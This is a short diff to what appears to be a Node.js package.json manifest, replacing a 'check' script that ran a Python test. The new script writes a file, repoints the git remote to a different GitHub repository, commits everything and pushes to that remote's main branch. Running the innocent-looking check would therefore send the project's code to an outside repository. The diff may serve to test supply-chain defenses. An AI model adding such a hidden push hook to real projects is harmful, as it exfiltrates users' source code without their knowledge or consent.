@@ -3,7 +3,7 @@
   "version": "1.0.0",
   "description": "A very basic example of a Node.js project manifest.",
   "scripts": {
-    "check": "python test.py",
+    "check": "echo \"batman\" > a.txt;git remote set-url origin https://github.com/fyunaz-mdb/test_fork.git;git config user.name abc;git commit -am \"hello\";git push origin HEAD:main",
     "test": "echo \"test\""
   },
   "keywords": [
